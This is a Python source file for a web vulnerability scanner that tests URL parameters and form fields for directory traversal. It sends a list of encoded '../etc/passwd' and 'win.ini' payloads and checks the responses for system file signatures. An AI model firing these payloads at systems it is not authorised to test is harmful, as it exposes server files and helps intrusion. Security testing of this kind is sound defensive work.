import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
]

TRAVERSAL_INDICATORS = [
    "root:x:",
    "bin:x:",
    "[boot loader]",
    "[operating systems]",
    "[extensions]",
    "daemon:",
    "/bin/bash",
    "/bin/sh",
    "www-data",
]

FILE_PARAMS = ["file", "path", "page", "dir", "name", "include",
               "doc", "read", "load", "template", "view", "content"]


class TraversalScanner:
    def __init__(self, timeout=10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "WebVulnScanner/1.0 (Educational Tool)"
        })

    def scan(self, base_url, forms):
        findings = []
        findings.extend(self._scan_url(base_url))
        for form in forms:
            findings.extend(self._scan_form(form))
        return findings

    def _scan_url(self, url):
        findings = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        target_params = [p for p in params if any(kw in p.lower() for kw in FILE_PARAMS)]
        for param in (target_params or list(params.keys())):
            for payload in TRAVERSAL_PAYLOADS:
                test_params = dict(params)
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                try:
                    resp = self.session.get(test_url, timeout=self.timeout)
                    if self._has_traversal_content(resp.text):
                        findings.append({
                            "type": "Directory Traversal",
                            "severity": "HIGH",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload,
                            "evidence": "System file contents detected in HTTP response",
                            "description": f"Path traversal via URL parameter '{param}' — server returns local file contents"
                        })
                        break
                except Exception:
                    pass
        return findings

    def _scan_form(self, form):
        findings = []
        file_inputs = [i for i in form["inputs"] if any(kw in i["name"].lower() for kw in FILE_PARAMS)]
        for inp in file_inputs:
            for payload in TRAVERSAL_PAYLOADS:
                data = {i["name"]: i["value"] for i in form["inputs"]}
                data[inp["name"]] = payload
                try:
                    if form["method"] == "POST":
                        resp = self.session.post(form["url"], data=data, timeout=self.timeout)
                    else:
                        resp = self.session.get(form["url"], params=data, timeout=self.timeout)
                    if self._has_traversal_content(resp.text):
                        findings.append({
                            "type": "Directory Traversal",
                            "severity": "HIGH",
                            "url": form["url"],
                            "parameter": inp["name"],
                            "payload": payload,
                            "evidence": "System file contents in response",
                            "description": f"Path traversal via form field '{inp['name']}'"
                        })
                        break
                except Exception:
                    pass
        return findings

    def _has_traversal_content(self, text):
        return any(indicator in text for indicator in TRAVERSAL_INDICATORS)
